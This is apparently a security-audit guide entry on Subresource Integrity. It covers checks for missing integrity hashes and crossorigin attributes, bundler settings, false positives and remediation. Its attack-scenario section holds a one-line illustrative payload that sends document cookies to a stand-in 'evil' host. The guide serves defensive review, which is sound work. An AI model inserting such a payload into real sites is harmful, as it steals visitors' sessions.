# P125 ‚Äî Subresource Integrity

## Overview
Subresource Integrity (SRI) prevents a browser from executing a script or applying a stylesheet whose content has been tampered with in transit or at rest on a third-party host. When a page loads `<script src="https://cdn.example.com/lib.js">` without an `integrity` hash, the browser trusts whatever bytes the CDN returns ‚Äî a compromised CDN, a MITM with a forged cert, a hijacked S3 bucket, or a malicious upstream package can silently swap `lib.js` for a credential-stealing version that runs with the page's full origin privileges. The root cause is the absence of a cryptographic commitment: there is no `integrity="sha384-..."` attribute to compare against, and frequently a missing or incorrect `crossorigin` attribute that would otherwise gate the integrity check itself. SRI is the frontend's last line of defense in the third-party / supply-chain trust model.

## What to check
- For every `<script src>` and `<link rel="stylesheet" href>` pointing at a different origin (CDN, third-party host, even a sibling domain), is an `integrity` attribute present with a current hash (`sha384` minimum; `sha256`/`sha512` acceptable, `sha1` is not)?
- Is the hash actually bound to the file currently served? A hash left over from a previous version silently breaks the page when the vendor republishes, and a hash copied from the vendor's *unverified* docs offers no assurance.
- Is the `crossorigin` attribute set (`anonymous` or `use-credentials`) and consistent with how the resource is fetched? Without `crossorigin`, the browser applies CORS-less semantics and **may skip the integrity check entirely** on some browsers; the attribute must match the resource's CORS configuration or the load fails.
- Are version-pinned, immutable URLs used (`lib@1.2.3`, a hash) rather than "latest"/floating tags (`lib@1`, `lib@latest`) whose contents drift ‚Äî silently invalidating any hash or, if no hash, silently changing executed code?
- Do build-injected assets (Webpack `crossOriginLoading`, Vite `build.crossOriginLoader`, Next.js `assetPrefix` with a CDN) carry SRI? The same applies to dynamically inserted nodes via `createElement('script')` set to `src` then appended.
- Are external hosts also restricted by a Content Security Policy `script-src`/`style-src` allow-list? SRI catches tampering; CSP limits *which* hosts may load at all.
- Is there a CSP `require-sri-for` (legacy) or per-source hash/nonce strategy that mandates SRI for third-party scripts?
- Does the application hot-link analytics/widgets (GA, Stripe.js, chat widgets, tag managers) directly from vendor CDNs without integrity? These are the most common un-hashed third-party scripts and a frequent supply-chain entry point.

## Static signals
Script/stylesheet tags pointing cross-origin without an `integrity` hash:
- `<script src="https://cdn.jsdelivr.net/npm/lodash@4/lodash.min.js"></script>` (no integrity)
- `<link rel="stylesheet" href="https://unpkg.com/bootstrap/dist/css/bootstrap.min.css">` (no integrity)
- `<script src="//ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>` (protocol-relative, no integrity)

Hash present but weak or detached:
- `integrity="sha1-..."` (deprecated digest)
- `integrity="sha384-..."` on a `<script>` whose `src` is a floating tag (`@latest`, `@^4`) ‚Äî will break or silently load unverified code on next publish.

Missing or mismatched `crossorigin`:
- `<script src="https://cdn.x.com/a.js" integrity="sha384-...">` (no `crossorigin`)
- `crossorigin="use-credentials"` on a CDN that does not send `Access-Control-Allow-Credentials`.

Build/bundler configuration missing SRI:
- Webpack: `output.crossOriginLoading` unset (default `false`) ‚Äî set to `'anonymous'` and emit integrity via `SriPlugin`/`html-webpack-plugin`.
- Vite: no `vite-plugin-sri3` or equivalent; `build.cspNonce` set but no integrity emitted.
- Next.js: `assetPrefix` points to a CDN but `experimental.csp`/integrity plugin absent.

DOM-injected external scripts:
- `const s = document.createElement('script'); s.src = 'https://cdn.x.com/a.js'; document.body.appendChild(s);` ‚Äî no `s.integrity`, no `s.crossOrigin`.
- `$.getScript('https://cdn.x.com/a.js')` (jQuery strips/ignores SRI entirely).

Package-level supply-chain proxies (related, not strictly SRI but same trust boundary):
- `<script>` loading from a domain you do not control (shared CDN aggregators) where one compromise hits many sites.

## False positives
- Same-origin (`src="/assets/app.js"`) static assets you host yourself and serve over HTTPS with pinned cert/HSTS ‚Äî SRI adds little because you control both the bytes and the transport; a hash can still help detect deploy tampering but is not strictly required.
- The hash is generated by your build pipeline and injected at deploy time against the exact emitted bytes ‚Äî this is the correct pattern.
- A third-party script legitimately cannot be SRI-protected because it is served with volatile content (e.g., an ad bidder that rotates creative). In that case the residual risk is real; document it and constrain it with a restrictive CSP + sandboxed iframe instead of skipping the control silently.
- `$.getScript`/dynamic loaders that intentionally bypass SRI for a known-safe local module ‚Äî confirm the URL is same-origin and not attacker-influenced.

## Attack scenario
1. The application loads a popular library from a shared CDN: `<script src="https://cdn.example.com/analytics@1/lib.js"></script>` with **no `integrity` hash**.
2. An attacker compromises the CDN account, hijacks the package's registry entry, or obtains a misissued/fraudulent TLS certificate for the CDN domain (or compromises an upstream dependency the library bundles).
3. The attacker republishes `lib.js` with appended payload: `...;fetch('//evil/?c='+document.cookie)`.
4. On the next page load, every visitor's browser fetches the new bytes and executes them in the application origin ‚Äî there is no hash to fail against.
5. The payload exfiltrates session tokens, reads `localStorage`, performs authenticated actions as each victim, or implants a persistent backdoor / crypto miner. Because the script runs with the site's full privileges and is served from a "trusted" CDN, browser warnings and CSP `script-src cdn.example.com` do nothing.

## Impact
- **Confidentiality**: full read of origin-scoped data ‚Äî cookies, `localStorage`, DOM, authenticated API responses.
- **Integrity**: arbitrary script execution in every visitor's session; mass account takeover, fraudulent transactions, defacement, persistence.
- **Availability**: script can lock the UI, mine crypto, or redirect away from the application.
- Severity scales with visitor privilege and blast radius: a compromised CDN-hosted library affects *every site embedding it*, and an admin-only page running the tampered script can lead to full platform compromise. Supply-chain compromise of a widely used CDN script is effectively a mass-exploitation event.

## Remediation
Always pin the version and attach an `integrity` hash plus matching `crossorigin`:
```html
<!-- VULNERABLE ‚Äî floating tag, no integrity, no crossorigin -->
<script src="https://cdn.jsdelivr.net/npm/lodash@4/lodash.min.js"></script>

<!-- SAFE ‚Äî pinned version + sha384 integrity + crossorigin=anonymous -->
<script
  src="https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js"
  integrity="sha384-abc...=="
  crossorigin="anonymous"></script>
```
Generate hashes from the exact bytes you ship (`openssl dgst -sha384 -binary lib.js | openssl base64 -A`), prefer your bundler's SRI plugin so hashes stay in sync at build time, and constrain third-party origins with a strict CSP `script-src`/`style-src` allow-list as defense-in-depth ‚Äî SRI stops tampered bytes; CSP caps which hosts may ever run.
